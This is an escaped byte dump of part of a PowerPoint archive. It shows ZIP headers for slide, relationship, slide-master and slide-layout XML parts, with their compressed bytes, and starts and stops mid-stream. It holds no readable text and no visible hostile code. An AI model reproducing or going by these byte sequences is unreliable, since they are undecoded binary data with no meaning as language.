C\xa5\x05\x14_\x00\xf9~\x12\xdbk`\x00d\xa8\xb4\x80\xc6=@\xe30\x18\xfe\xd1g*-\xa0\xe4\x02\xc8\xd0\x19~\xd2g*-\xa0\xdb\x1e\xa08\x1a\x0f?\xe93\x15[\xbc\xbe/1\xeb\t\xb4\xdbr\x16Z\xce^\x96)\xfa\xfd-\x9bg\x0b?\x08F^\x1cd\xa3\xd0_D\xa3\x04.\xbd\xd1\xed}\x16d\x11^\xcc\xb17\xffcjq\x1c\x99"\xf8\xfb\xbe,(\x88tU?\x8e\xde\xd5\xfdU\x99K\xa1\xc4F\xdf\xe4\xa2j\x1f\x10n-^\xa8\xacEi\xdf\x10\xd8o\xaa\xfeFuk$m\x19\x0e)\x11\xb2\x84\x07\x02h\n\xf9\x8a\x9cZ\xc0K\xc0\xdc/\xadk\xcel\xf6\x95\xdc>\x9d)\xcf\xc3y0\x0f\x9b\x92\xbds\xb1-\xab{\xbd\x84\xdf\x89\xc2\xad\xfe\x1f\xa2\xb6\xdd\xc3a\x91\x03\xd4\xee\xdb\r\xf5\x1f<\xb3\xbf\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\x8cOM*\x01\x00\x00N\x02\x00\x00\x15\x00\x00\x00ppt/slides/slide1.xml\x8cQ\xc9n\xc20\x10\xbdW\xea?X\xbe\x17\xa7=TUD\xe0\xd0\xedDA\x82~\x80\xe5LH$o\x1a\xbb!\xfc}\xc7\x86(\xb4\xe2\xc0\xc5\xb3\xbe7\xf3\xc6\xf3\xe5`4\xeb\x01C\xe7l\xc5\x1fg\x05g`\x95\xab;\xbb\xaf\xf8\xf7\xee\xe3\xe1\x85\xb3\x10\xa5\xad\xa5v\x16*~\x84\xc0\x97\x8b\xfb\xbb\xb9/\x83\xae\x19\xa1m(e\xc5\xdb\x18})DP-\x18\x19f\xce\x83\xa5Z\xe3\xd0\xc8H!\xeeE\x8d\xf2@\xacF\x8b\xa7\xa2x\x16Fv\x96\x9f\xf1x\x0b\xde5M\xa7\xe0\xcd\xa9\x1f\x036\x9eH\x10\xb4\x8c\xb4yh;\x1fF6\x7f\x0b\x9bG\x08D\x93\xd1\x7fW\n\xad;\xacd\x88\x80[b*\xf8\x82\xa4\xaa\xad\xae\x93\r~\x87\x00\xc9\xb3\xfd\'\xfa\xad\xdf`.\x7f\xf5\x1bd]M\x07\xe4\xccJCw\xe2\xe2\\8\xb7\xe5\xd0\xf6\xd9\x11\xff\xe0\xfb\xd1\x95\xe5\xd0\xa0I\x96\xc4\xb2!Mg\xc7\xf4\x8a\x94\x83!2uJ\xaa)\xab\xda\xf5\x95^\xd5\xbe_\xe9\x16\xe3\x00q1TL\xb2\xc4\xa4Ti\\I\xbf\xee\xf3V&\x9f\xe35\xa7<\xfd\xe1I\xc3EK\xe2 \xdc/\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x1b.5\x07\x0c\x01\x00\x00\xd0\x03\x00\x00\x1f\x00\x08\x01ppt/_rels/presentation.xml.rels \xa2\x04\x01(\xa0\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x93AN\xc30\x10E\xf7H\xdc\xc1\x9a=qR\xa0B\xa8N7\x08\xa9\x0b$\x04\xe1\x00&\x99$\x16\x8emyL!\xb7\xc7j\xa1$U\x15u\x91\xe5\xff\xf6\xfcy\x9a\xb1W\xeb\xefN\xb3-zR\xd6\x08\xc8\x92\x14\x18\x9a\xd2V\xca4\x02\xde\x8a\xc7\xab;`\x14\xa4\xa9\xa4\xb6\x06\x05\xf4H\xb0\xce//V/\xa8e\x88E\xd4*G,\xa6\x18\x12\xd0\x86\xe0\xee9\xa7\xb2\xc5NRb\x1d\x9axR[\xdf\xc9\x10\xa5o\xb8\x93\xe5\x87l\x90/\xd2t\xc9\xfd0\x03\xf2Q&\xdbT\x02\xfc\xa6\xba\x06V\xf4\x0e\xcf\xc9\xb6u\xadJ|\xb0\xe5g\x87&\x9ch\xc1\x9dGz\xf666c\x85\xf4\r\x06\x01\x07+\x89i\xc0OC,\xe6\x84 \xad*\xfc\x07\xd8\xc9_7\x9b\x82\xc8f\x87x\x92\x14\xd0\x1f\xa1\xec\xcd\xd1\x8dI\xac\xe5\x9cXA\xbek|\r\xbd\xc6\xc1\x8a\x06\xe6\x14\xc8\xed\xac \xb1v\xb0\xa4\x9d\xdc\x9b\x93\xc3\xb8\x99\x93a\xab\xf0\xeb\xe8\xb5\x1e\xac?\x08>\xfa\x87\xf9\x0f\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00<\xc2%\xdd\xc0\x00\x00\x007\x01\x00\x00 \x00\x00\x00ppt/slides/_rels/slide1.xml.rels\x8c\xcf\xbdj\xc30\x10\x07\xf0\xbd\xd0w\x10\xb7W\xb2\x03-\xa5X\xceR\n\x86L%}\x80C:\xdb"\xb2$tr\x88\xdf\xbe\x1am\xe8\xd0\xf1\xbe~\x7f\xae;?\x16/\xee\x94\xd9\xc5\xa0\xa1\x95\r\x08\n&Z\x17&\r?\xd7\xaf\x97w\x10\\0X\xf41\x90\x86\x8d\x18\xce\xfd\xf3S\xf7M\x1eK=\xe2\xd9%\x16U\t\xaca.%}(\xc5f\xa6\x05Y\xc6D\xa1N\xc6\x98\x17,\xb5\xcc\x93Jhn8\x91:5\xcd\x9b\xca{\x03\xfa\x83)\x06\xab!\x0f\xb6\x05q\xdd\x12\xfd\xc7\x8e\xe3\xe8\x0c}F\xb3.\x14\xca\x1f\x11\x8a\xbd\xb3t\xc1-\xae\xa5\xb2\x98\'*\x1a\xa4\xdc\xf7\x0fK\xaf\xb2F\x80\xea;ux\xb7\xff\x05\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00^\xab\xe0S\x86\x05\x00\x00\x0b\x1d\x00\x00!\x00\x00\x00ppt/slideMasters/slideMaster1.xml\xecY\xdbn\xdbF\x10}/\xd0\x7f \xf8Z($\x97w\xc1r`[V\x12\xc0\xb9\xa0N>`E.%\xc6+\x92]\xaed\xb9E\x81|R_\xdb\xc7~J\xbe\xa4\xb37\x89R$\xc7q\\!M\xfd"\x8e\x86\xc3\x993;g\x87\xb3\xd2\xd1\xd3\xe5\x8cZ\x0b\xc2\xda\xb2\xae\x06\xb6\xf7\xc4\xb5-Reu^V\x93\x81\xfd\xee\xed\xa8\x97\xd8V\xcbq\x95cZWd`\xdf\x90\xd6~z\xfc\xe3\x0fGM\xbf\xa5\xf9K\xdcr\xc2,\xf0Q\xb5}<\xb0\xa7\x9c7}\xc7i\xb3)\x99\xe1\xf6I\xdd\x90\n\xee\x155\x9ba\x0e_\xd9\xc4\xc9\x19\xbe\x06\xdf3\xea \xd7\x8d\x9c\x19.+[?\xcf\xee\xf2|]\x14eF\x86u6\x9f\x91\x8a+\'\x8cP\xcc\x01\x7f;-\x9b\xd6xk\xee\xe2\xada\xa4\x057\xf2\xe9\rH\xc7\x90_vIsq\x1dO\xd4\xe7\x1bv|\x84\xfbmM\xcb|TR*\xbf\x08\xd7\xe4\x8c2k\x81\xe9\xc0\x1eO<\xdb9>r\xb6\xacHQ\x90\x8c_\xb4\\\xdc3\x9e\xa4 \x1c\xb7\xcd[F\x88\x90\xaa\xc53\xd6\\6\xe2.D\x7f\xb5x\xc3\xac2\x87\xa2\xd8V\x85g\xb0\xf6\xc2\xb7\xbc\xa1\xcd\xe4\xd7j!\x05g\xeb\xf1\x89\x11q\x7fY\xb0\x99\xb8\xc2\xd2Y\xcb\x81\r\x15\xbe\x11\x9f\x8e\x84\xb6\xe4V\xa6\x94\xd9Z\x9bM_\xef\xb0\xcd\xa6\xe7;\xac\x1d\x13\xc0\xe9\x04\x15Y)p;\xd2\x89L>\xe3+\xab\x1e\xbf\x87\xa5\xb1@gr\xdb\x99\xd8\xda\xeb\xce\x94P\x9c\x86\x9e\xc2\xea\xb9\x81\xeb\'q\xb8\x99\x9e\x17D\x9e\xe7\x87;qCb\xf3\x96?#\xb5\x94\xf1B\xd5\t\xf7\'\xb9\x91\xf0\xd4H\xd9\xb22"\x13\xb8\xa1\xe6\xd4\xb6\xf8\xc0\xe6\xb6\x05\xf4e\xb65\x86\xb4T\xec\x06s\xf1\x9c\x11\xad\xeb\x0e\x0c\xa1\x9c\xd5\x0b\xf2\xb6\x96\xb7\xf9\xd6Z;\xdd\xbb\xb4\xeaZI\x17n\x14n\x18+\x13G\x05Z\t2\xb8\xb3\x99\x1e\xad\x04\x0e\x14\x06\xae\x02\xb1\xc9f6\x19\xaf\xb8\x8c|o\x84L\x80\x8e\x99\x0c\'\xcb\xa2\x8a\xd1\xf4\xf9\xf2\xb4\xceo\x84\x831\\\xa1\xca\xd7\x0c\xc3\xeek\x7f\x99cFl\x8b\xbe\xa8Z\x99\x1d7\x023\xc2x\xa5\xe1\xf4\xac\xa6+\xa6\xd1\x96_\xf2\x1bJ\xd4:\xcaBV\xf9\x1b\xcc\xf0\xcf\x8a\x12R\xe9\xac#K0\xb7\xb3\x0e\x19\xd2=\xafi\x0e-\x0bm\x10Nf\xdf\\\xd4\xd9UkU5l#\xb1\xeb\x14\xf9V\x16\x8a\x91\xe2\xdaL-~\xd3\x80/^rJ\xb4\x9d\xbay\x17\xb6\xc6a\x18\t*B\x01\x03\x14#\x14oq\xd5\x8f\\/JS\xc5U/v\x93\xd43m\xc5xj\x98*\xa9%\x04\xe0\x1dpQ\x96\xd3\xb0W\xac\x906y\xe0R\xa9\x95:\x99\xf3zT\xeaH\xcaU\xb7nR^PO\xe7\x9f\x93bU\xb8\x95Z\xc8\x1d\xf3\x87\xa9\xb2\xbfUe\xff!\xaa,\xf2\xb3\xc1\xbd\xa8\xcd\xd7\x14\x1b\x05 F\xd2\xc5\xbej\xc7n\x90\xa2Hr\xf3\xb1\xda\x9f\xadv\xb0U\xed\xe0!\xaa]p\xe8\xe2\xed\xaf\x03[\xac\x12\x0c7\xba\xf2\xf2\x85\xf2E\x95\x0f=?\t\x90*}\x9a\xfa\xbe\x1bn\x95>H\xfc\xc8\x0bu\xe5C\x1f\xde[*\xc8\x7f\xb1\xf0\x16\xa6\x13\x98\x1f3X\xbc5\x07>7.\xf1\xa5\'\xadyYq\xa5\x89C\xd7]\xbds\x8c\xf1\x8e7\x90\xf1\xff\xafS,\xdc\xa2\x98\xac\xd0\xd7R,\xe7\x8aaSL\x0bM/9\xff\xdc\xb7\xb1\xecd\x97\x1f\xc4a\x9a\xea\x89\xe7\xfb`\x17\xfd\xa6\xb8U\xd0\\R\xe47o\x98\x9c\x0ec7\xee\r\xd3\xb3Q/pO\xce{\xa7\xc1Y\xd4;K\x93\xe1\x89\x8f\xdc\xf0\xccM\x7f\xb7M\xed1\'\xbc\x9c\x91Q9\x993\xf2z\xae\x96\x9cA\x8e\x14\x8b#\x17\xa9z\xef.U%\xf9q\xe2 \x04\x87\x12\xe4\x0b\x00j\x98+\xc4\x99\xa4K\xec\xed\xe7\xee\xc3\xf2\xd5D\xaeY\xbe9\x8d\xdf\x93\xe5p<|5\x9f\xed\xea\xa5r\xe0\xf9"\xb2{n\x92\x887\xe5\xff\x8a\xee\xdfV+]\xd1\xfd4\x1aya\x88\x92\x1e\xf2\x86\xe7\xbd`tr\xd2K\\\xef\xbc\x17\xf9\xc1p8<\x19\x05\xa7\xe8tE\xf7\x16B\x91\nh\xa0\x08\xfd\xf1\xc3\x9f\xaf\xfe\xfe\xe3\xe3\x87\xbfn!\xf4-\x1c\x96\x17uZ\x16\xe4\xd3\xe7\xf3\x8c\xb2\x97\xb8\xb1\xe0\xf0\r-\x82\xc3i\x19\x16\x036\xda\x15H\xe3\t\x12:$tH\xe8@\xc2Y\x06G~\xb0\xd0\x82\xd1 \xa3Y\xd9\xf8F\xe3\x1bM`4\x81\xd1\x84F\x13\x1aMd4\xb0\xab\xa6\xb4\xac\xae\xa0\xd1\x8b\x8bm\x155}\xae\x14FR\xfb\x0cv\xca\x05\xbe\xa9\xe7\xfc\x858rni\xd4\xe9\xc5\x0bb1.\xc0\xf4h\xb1\xbe\xd0\xb0\x17\xb9\xdc\x01\xb7\xd8\xa2\x8e\xad>\xee\xec\xb5\xf5;\xb6zh\xdek\x1btl\xf5\xc8\xb5\xd76\xec\xd8\x9a\x11\xea\xd3t\xf9Rr\xad\x95\xb28S\xed\x9f+\xa5\x12\x03\xcd%\xc1\n\x9c\x01\xc9~\x9a\xbd\xefQ\xae\xfb\x01\xde\xbaA\xb0\xfe\xf5\xa2\xdd\xba\x91\xb5zw\xec\xdc\x01\x9b@\x1a\xb9a?\xd9\xa73\xcc.\xcc\x06\xbf\r^\xb5\x0f^\xb5\x0f^u;<)\xa25\x84 \x8c\x91>\xd1\x1f\x08\x87\x08\xaeq\xf8k\x1c\xa9\x17\x98_\x16\x0e\x84C\x04\xd78\x825\x0e\xcf\x8f\xbd\xe8\xb0@Dt\r$\xec\x00IP\x92\x1c\x16\x88\x88\xae\x81Dk \x08%\x91x!\x1c\x10\x88\x88\xae\x81\xc4\x1d q\xe0\x1f\x98\xab"\xba\x06\x92\xac\x81\x08\x14\x07&\xab\x88\xae\x81\xa4\x1d Q\x18\x1f\x98\xac"\xba\xfa\tz\xdd\xd6\x9a~\xcd\xa7\x84=6\xb9\xc7&\xf7\xd8\xe4\x1e\x9b\xdcw\xd4\xe4\xba}M\x1e*\xcc\xb4\xa9\x86Q\xf5\'\xe6\xf1?\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00E-\xb6\xdaz\x03\x00\x00R\x0c\x00\x00!\x00\x00\x00ppt/slideLayouts/slideLayout1.xml\xecW\xcdr\xd30\x10\xbe3\xc3;xtw\xfd\xef\xc4\x19R&\x89\x9b\xc2Li;\xa4<\x80j+\x89A\x96\x85\xa4\x98\x04\x86\x99>\x12W8\xf2(}\x12\xf4c\'m\x08\x9d@\xa1\xd3\x03\x97h\xb5Z\xadv\xbfo-m\x9e=_\x96\xd8\xaa\x11\xe3EE\xfa\xc0;p\x81\x85HV\xe5\x05\x99\xf5\xc1\x9b\x8b\xb1\xdd\x05\x16\x17\x90\xe4\x10W\x04\xf5\xc1\nq\xf0\xfc\xf0\xe9\x93g\xb4\xc7q~\x02W\xd5BX\xd2\x07\xe1=\xd8\x07s!h\xcfqx6G%\xe4\x07\x15ED\xaeM+VB!\xa7l\xe6\xe4\x0c~\x90\xbeK\xec\xf8\xae\x1b;%,\x08h\xf6\xb3}\xf6W\xd3i\x91\xa1\xb4\xca\x16%"\xc28a\x08C!\xe3\xe7\xf3\x82\xf2\xd6\x1b\xdd\xc7\x1be\x88K7z\xf7\xed\x90\xc4\x8a\xcal\xab\xcb\xb7\xc0\xd2F\xac\x96S\x0f\x1c\xca\xbc\xb3\t\xce-\x02K\xa9\xb8(\x04F\xd6\x04\x179\xd2K\x9c^0\x84\x94D\xeacF\'\xf4\x9c\xe9\x1d\xa7\xf59\xb3\x8a\\yhv\x02\xa7Yh\xcc\xf4\x94\xd4Zp\xb6\xb6\xcfZ\x11\xf6\x96SV\xaaQ\xc2`-\xfb@\xb2\xb5R\xbf\x8e\xd2\xa1\xa5\xb02\xa3\xcc6\xdal~\xb6\xc36\x9b\x1f\xed\xb0v\xda\x03\x9c\x1b\x87\xaa\xacLp?\xa7\xe3\xb7\xe9\xbc\xa8p\x8e\x98\xe5\xaf\xd3j\x03\xe6\xf4\xa4\xca\xdeq\x8bT2!\x95\xbf\xc9oma\x92V#\x9d7\xa0g\x82i\\\x1bS\xb3\xae\x85M@;\xd1\xf0\xbc \x08;\x91\xce3\x08<\xcf\xf5:\xb7\x91\xf1\xfcn\x18\xbbQ\x93\xb2\xef\x87~\x12\xc6\xb7\x12\x87=\xca\xb88FUi)\xa1\x0f\x18\xca\x04PzX\x9fpaL[\x13\x1d\x95\x89\x85\xf6\xc4rX\xe5+ey)G\x89\xcf\x07\x06e\xc2\xfc\xfd\x022\x04,\xfc\x92p\r\xb6h\x05\xd6\n\x97\x8d`\xe0\x1a,D5.\x9a\x93\x8c+\xb5\x80\xb9\x98\x88\x15FZ\xae\xb1\xd7 \x90\xa3\xe9kS37\xd4J\xbeaN5\x04$?\x87\x0c\xae\x8d\xa9\x0e\xbe\rZ\xe7q7\xd5\xc1\x16\xd5\xc1\xdf\xa0\x9a/.\r\xd5\xf2\x08\xc9O\xf8\xdb\x94\xfb~\x1c\'\x8aP\xc9g\x94t=/\xd1%x\x83r7\xea$n\x924\x94\xc7\x1dY\x14\xd1\x7f\xca\xf7\xa2<\xdc\xa2\\\xd3s_\xca\xa7\x82\xc9\x17\xe5c\x1f(\x94\x04b\r\xf5\x86\x93_R\xaf\x0f\xfe\t\xef=\x10\xd6\xc5\xb0\x03I\x0b\xe2\x19\xd1w\x8d&\xc1\x80\xaaS\xaa\xe4m>.0\xd6\x13\xf5t\xa0\x11fV\rq\x1f\x88\xa5z\x01`O\x14D\x18M\'r\xdd\xf6\xea\\\x1b\x9b\xd9\xc6\x8f\xb3\xf1\xff\xcf9\x8b\xb68\xd3\xb8\xde\x97\xb3\\\x18\xca\xe6\x10O\x1b\xbe\xcc\xb5\xf9\xe0|\xe1G\xc5\xd6T6\x02\n\xf4O^\xda\x1d\xa6\x1d\xb7c\xa7\xc9hl\x87\xee\xe0\xc8\x1e\x86\xa3\xd8\x1e%\xddt\x10\xf8n4r\x93\xcfmS\x91C\x81DQ\xa2q1[0t\xb60\x97\rS\xf8@\xd5u!b\xbf\x99\x18 \xc4a\xd7\xf1}\xd9\x97\xf8\x81\n@\xe80\xe4\xa9\xb7Ke{\xdf\x9f\xd4M\xbcU7\x9a\xdf{_\xef8?]\x94\xbb>w\xfd0?|\xf9<\xae\x8f}]>\xc3x\xecE\x91\xdf\xb5}/=\xb2\xc3\xf1``w]\xef\xc8\x8e\x830M\xd3\xc18\x1c\xfa\xc3u\xf9p\xd5m\x12\t\xab)\x90\xeb\xab\xaf\xa7\xdf\xbf\\_}\xbb\xa3@\xee\xa8\t=\x98\xa6U\x919Q[\xe5\x88\xd9+H\xcfj\r\x92\xec\x9d%q#\xad\xa2\xb2wox\xdf\x98(\x1f\xed\x7f\x81\xc3\x1f\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00$\x16\xd7\xae\xfc\x02\x00\x00\xef\n\x00\x00!\x00\x00\x00ppt/slideLayouts/slideLayout2.xml\xdcV\xcdr\xd30\x10\xbe3\xc3;h|7v\x9c\xdff\x9at\x928\x01fJ\xdb!\xed\x03\xa8\xb6\x9c\x18dIH\x8aq`\x98\xe9#q\x85#\x8f\xd2\'a%\xdbI\x1bJ\xa7C\x0b\xedp\xb1V\xeb\xdd\xd5~\xdf\xae~\xf6\x0f\x8a\x8c\xa2\x9cH\x95r6p\x1a/|\x07\x11\x16\xf18e\x8b\x81sv:s{\x0eR\x1a\xb3\x18S\xce\xc8\xc0Y\x13\xe5\x1c\x0c\x9f?\xdb\x17}E\xe3C\xbc\xe6+\x8d \x06S}<p\x96Z\x8b\xbe\xe7\xa9hI2\xac^pA\x18\xfcK\xb8\xcc\xb0\x86\xa9\\x\xb1\xc4\x1f!vF\xbd\xc0\xf7;^\x86S\xe6T\xfe\xf2.\xfe<I\xd2\x88\x84<Ze\x84\xe92\x88$\x14k\xc8_-S\xa1\xeah\xe2.\xd1\x84$\n\xc2X\xef\xeb)\xe9\xb5\x00\xb4\xfc\xfc\x9d\x83\xac\x91\xcca\xdap\x86\x80;\x9a\xd3\x181\x9c\x81\xe24\xd5\x94 `\x07M8\xd3\x10\xc9\x1a(q*\t1\x12\xcb_J1\x17\'\xd2\xfa\x1d\xe5\'\x12\xa5\xb1\x89S\xf9;^\xf5\xa32\xb3S\x96[\xc1\xdbq_\xd4"\xee\x17\x89\xcc\xcc\x08d\xa0b\xe0@\xcd\xd6\xe6\xeb\x19\x1d)4\x8aJe\xb4\xd5F\xcb\xe3\x1bl\xa3\xe5\xf4\x06k\xaf^\xc0\xbb\xb2\xa8AU&\xf7+\x9c\xa0\x86\xf3\x8a\xd3\x98H\x14l`\xd5\t+q\xc8\xa3\xf7\n1\x0e\x80\x0c\xfe\x12\xdf\xc6\xa2\x04mF\xb1\xac\xa8\xd7\x86\xda\xca\xae\xfci\x85m6\x15[\xba\x18\xf3xm\x169\x87\x112\xa2\xaf\x99\xb2\x80t-\xc8Z8\xaf\x04\x0b\x9e*=\xd7kJ\xac\x9c\xd3F\x95jL\x92\xb7%\xffW\xd4F\xbeb.,\xd1,>\xc1\x12o\x8c\x85\xcd\xb0N\xc7\xab\t\xfb=m\xcd\x1d\xda\x9a\x0fA\x9b!\xc1\x81\xf0\xc5\xd6\xfc\xffd\xaf\xb5\xc3^\xeb!\xd8K\xb4\x84\xe3\xee\xd3\xc0\xf9\xb0\xc2R\x13Y1\xd9\xfe\xc7L"L\x17p\x1aG\x90\xcd\x96T\x0b\x89\xd34\x9e\xa5\x94\xda\x899\xd7\xc8\x84J\x94c\n\x1b\xa60\xc7\x13\xee\xeb\x94\xe9R\xd3m\xfb~\xbd\xa37\xc6\xe5l\x1b\xc7\xdb\xc6\xff\xeb5k\xef\xd4\xcc\xf2z\xdf\x9a\xc5\xba,\xd9\x12\xd3\xa4\xaaW\xe7q\xeaE\x9fT\xb5\x12\xb8\xa5\x0c\xe9\x9f\x1bao\x1cv\xfd\xae\x1b\xeeMfn\xcb\x1fM\xddqk\xd2q\'{\xbdp\xd4\x0c\xfc\xf6\xc4\xdf\xfbR\xdfx1\xd6D\xa7\x19\x99\xa5\x8b\x95$\xc7+s\xa3\xe1\xbe4\xfc`\xf3$ \xcc=\x9b\x97D\xe8a\xcf\x0b\x02\xb84\x83\xa6I@\xdb4`\xd5\xeb\xad\xb2\xeb\xf7\'}\xd3\xd9\xe9\x1b[\xdf\xfb\xf6\r<_\x8eV\xd9M\xdb\xbd\xfb8\xed\xf3\xb46\xfb\xa6}\xc6\x9dY\xa3\xdd\x0ezn\xd0\x08\xa7nk6\x1a\xb9=\xbf1u;\xcdV\x18\x86\xa3Yk\x1c\x8c7\xed\xa3`)\xc2\x80\xd6\xb2A./\xbe\x1d\xfd\xf8zy\xf1\xfd\x96\x06\xb9\xa5\'\xecP\xbe\xa5L1\xe7\xc6\x15F*\xdf`q\x9c[\x92\xe0a\x07\x85\x9bX\x95\x80\x87eU\xf7\xad\x89\x89Q?T\x87?\x01\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xa1\x8b\xe6\x1df\x03\x00\x00\x82\r\x00\x00!\x00\x00\x00ppt/slideLayouts/slideLayout3.xml\xecW\xddn\xd30\x14\xbeG\xe2\x1d\xa2\xdc\x87\xa4i~\xda\x8a\x0e\xb5\xcd\nHc\x9b\xe8x\x00/q\xdb\x80c\x1b\xdb\xcdZ\x10\x12\x8f\xc4-\\\xf2(<\t\xc7v\xd2\x8e2\xa6\x01c\xda\x057\xf1\xb1}\xfc\xf9\x9c\xef;\x89\x9d\xc7O\xd6\x15qj,d\xc9\xe8\xd0\xed<\n\\\x07\xd3\x9c\x15%]\x0c\xddWgS\xaf\xe7:R!Z \xc2(\x1e\xba\x1b,\xdd\'\x07\x0f\x1f<\xe6\x03I\x8a#\xb4a+\xe5\x00\x06\x95\x034t\x97J\xf1\x81\xef\xcb|\x89+$\x1f1\x8e)\xcc\xcd\x99\xa8\x90\x82\xaeX\xf8\x85@\x17\x80]\x11?\x0c\x82\xc4\xafPI\xddf\xbd\xb8\xc9z6\x9f\x979\xceX\xbe\xaa0U\x16D`\x82\x14\xc4/\x97%\x97-\x1a\xbf\t\x1a\x17X\x02\x8cY\xfdcHj\xc3![v\xfe\xdau\x8c\x93\xa8\xa1\xdbq\x0f \xef|F\n\x87\xa2\n\x06\xce.\x983aT\x01\x86\x99\x92\xfcL`\xac-Z?\x15|\xc6O\x85Yq\\\x9f\n\xa7,4B\xb3\xd2\xf5\x9b\x89\xc6\xcdtim\x0c\x7fo\xf9\xa25\xd1`=\x17\x95n\x81\x06g=tA\xad\x8d~\xfaz\x0c\xaf\x95\x93\xdb\xc1|7\x9a/O\xae\xf0\xcd\x97\x87Wx\xfb\xed\x06\xfe\xa5MuV6\xb8\x9f\xd3\t\xdbt\x9e1R`\xe1\x84\xdb\xb4\xda\x80%?b\xf9\x1b\xe9P\x06\t\xe9\xfcm~[\x0f\x9b\xb4n\xf9\xb2!]\x95\x8a\xe0\xc6\xcfN\x1ac\x17M\xc3\x96Z\x8fY\xb1\xd1\x9b\x9cC\x0b\x11\x91\xe7T\x9a\x84Tk\x88\xd68o\x0c\x93<\x91j\xa66\x04\x1b\xbb&\x9d&\xd4\x02\xcf_Z\xfe/\rk\xfb\x92;7D\xd3\xe2\x14\t\xb4u\xe6&\xc26\x1c\xbf%\xec\xd7\xb4u\xf7h\xeb\xfe\x1dm\xf2\x1d\xd4:"s\x17\xc0\xd7Z\x94k\xb9\xbb\xa2\x8c\xd28Nb[\x1fa\x04fb\xf6\xdbUT\x12\xa7Q\'\x8em\xa5\xa4A\xd4\x0f\x13\xbb\xc9\x0e\x89\x0b\xa9\x9ebV9\xda\x18\xba\x02\xe7\xfa\x8d@\x03T\x1fI\xd5\xd0\xd4\xb84\x14\xd9\x88~\x12\xf1B HX\xbe]!\x81\xdd\x9bHj\xe9\x1a\xad\x14\x9b\x96\xcdN\x16\xea^H\x1d\xedI\x1d\xdd\xaa\xd4\xa6p~O\xea\xb4\xd7\xed\xf4\xa3\xffZ\xff\x03\xad\xe3=\xad\xe3\xdb\xf8\x1a\xce\x95p\x8d\xec\x9a%\x85E\xa3\xbc\xc1\xbe\xc3\x0f\xa4\x83\xc8\x02.\x089D\xb3#\xd5\xa4\xc4HYLKBLG\x1f\xb5xB\x84S#\x02_\xf2\xb5>1\xd1@\x95T\xd9\x914\x0e\x82\xf6\xa8\xd9:\xdb\xde\x0e\xc7\xdf\xe1\xffs\xcd\x92=\xcd\x92\xdb\xd0\xacPV\xb2Ko\xaa\xc1\xbd{\xbd\xc8\xbdRk\x0e\x17\'M\xfa\xfbN\xd6\x1bgi\x90zY\x7f2\xf5\xa2`t\xe8\x8d\xa3I\xe2M\xfa\xbdl\xd4\r\x83x\x12\xf4?\xb4\x97\xb0\x02)\xac\xca\nO\xcb\xc5J\xe0\x93\x95\xfd\xd8\x08\xcd\x0f\xd2\xb7TL\xbdW3K\x84:\xe8\xf9a\x08\xf7\xb8\xb0\xab\x03P&\x0c\xd8\xf5\xc7R\xd9_\xf7\'u\x93\xee\xd5Mz\x1bu\x037\xea\xe3Uu\xd5\xebn\xe0\xef\xbe|\xee\xd7\xcb\xbe-\x9fq2\x85#*\xecya\';\xf4\xa2\xe9h\xe4\xf5\x82\xce\xa1\x97t\xa3,\xcbF\xd3h\x1c\x8e\xb7\xe5#a+L\x81V[ \xdf>~>\xfe\xfa\xe9\xdb\xc7/\xd7\x14\xc855a\x1a{\xc9\xd7b\xce\xf4Rh\x89x\x81\xf8ImH\x82\x7f\r\x10nb\x868\xfc\xeb4\xba\xef\\4F\xfb\xeft\xf0\x1d\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xdcV\xffb\xe6\x02\x00\x00\xaa\t\x00\x00!\x00\x00\x00ppt/slideLayouts/slideLayout4.xml\xccV\xcdr\xd30\x10\xbe3\xc3;x|7\xfe\x89\xf3\xd3L\x93N\x12\xc7\xc0Li:\xa4}\x00\xd5\x96c\x83,\x0bI11\x0c3}$\xaep\xe4Q\xfa$\xacd;iC\xe9t\xa0\xd0^\xac\xd5jw\xf5\xed\xb7+Y\x87G\x9b\x9c\x18%\xe6"+\xe8\xc8t_8\xa6\x81iT\xc4\x19]\x8d\xcc\xf3\xb3\xd0\x1a\x98\x86\x90\x88\xc6\x88\x14\x14\x8f\xcc\n\x0b\xf3h\xfc\xfc\xd9!\x1b\n\x12\x1f\xa3\xaaXK\x03bP1D#3\x95\x92\rm[D)\xce\x91xQ0La-)x\x8e$L\xf9\xca\x8e9\xfa\x08\xb1sb{\x8e\xd3\